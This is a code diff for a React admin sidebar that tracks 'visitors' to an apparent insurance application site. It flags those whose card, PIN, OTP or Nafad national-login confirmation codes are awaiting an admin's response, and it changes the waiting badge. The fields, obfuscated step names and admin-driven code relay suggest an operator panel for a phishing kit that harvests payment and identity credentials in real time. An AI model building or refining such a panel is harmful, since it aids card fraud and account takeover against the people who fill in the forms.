@@ -23,24 +23,24 @@ interface VisitorSidebarProps {
 // Check if visitor is waiting for admin response
 const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
   // 1. Check if visitor is on Nafad page and waiting for admin to send code
-  // currentStep "_t6" is Nafad page. If no code sent yet, admin needs to act.
   if (visitor.currentStep === "_t6" && !visitor.nafadConfirmationCode) {
     return true;
   }
 
-  // 2. Check main status fields for "waiting" or "pending" status
-  // These are often set when a user submits a form (OTP, Card, etc.)
+  // 2. Check OTP status - show waiting indicator when OTP is verifying
+  if (visitor._v5Status === "verifying") {
+    return true;
+  }
+
+  // 3. Check other status fields for "waiting" or "pending"
   if (
     visitor.cardStatus === "waiting" || 
     visitor.cardStatus === "pending" ||
-    visitor.otpStatus === "waiting" || 
-    visitor.otpStatus === "pending" ||
     visitor.pinStatus === "waiting" || 
     visitor.pinStatus === "pending" ||
     visitor.phoneOtpStatus === "waiting" || 
     visitor.phoneOtpStatus === "pending" ||
     visitor.nafadConfirmationStatus === "waiting" ||
-    visitor._v5Status === "pending" || // OTP 1 status
     visitor._v4Status === "pending"    // Phone verification status
   ) {
     // Double check: if it's a Nafad related waiting but code is already sent, it's not waiting for admin anymore
@@ -48,17 +48,6 @@ const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
       return false;
     }
     return true;
-  }
-
-  // 3. Check history for any "pending" entries
-  // This is the most reliable way as every submission creates a history entry
-  if (visitor.history && Array.isArray(visitor.history)) {
-    const hasPendingAction = visitor.history.some(entry => 
-      entry.status === "pending" && 
-      (entry.type === "otp" || entry.type === "phone_otp" || entry.type === "card" || entry.type === "pin" || 
-       entry.type === "_t1" || entry.type === "_t2" || entry.type === "_t3" || entry.type === "_t5")
-    );
-    if (hasPendingAction) return true;
   }
 
   return false;
@@ -230,9 +219,8 @@ export function VisitorSidebar({
                     <div className="flex items-center gap-2 flex-1 min-w-0">
                       <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">{visitor.ownerName}</h3>
                       {isWaitingForAdmin(visitor) && (
-                        <span className="flex items-center gap-1.5 text-xs font-bold text-white bg-red-600 px-2.5 py-1 rounded-full animate-pulse shadow-md border border-red-400">
-                          <RefreshCw className="w-3.5 h-3.5 animate-spin" />
-                          انتظار ردك
+                        <span className="flex items-center justify-center bg-red-600 p-1.5 rounded-full animate-pulse shadow-md border border-red-400">
+                          <RefreshCw className="w-3.5 h-3.5 animate-spin text-white" />
                         </span>
                       )}
                       <span className="flex items-center gap-1 text-xs font-medium text-white bg-teal-600 px-2 py-0.5 rounded whitespace-nowrap">
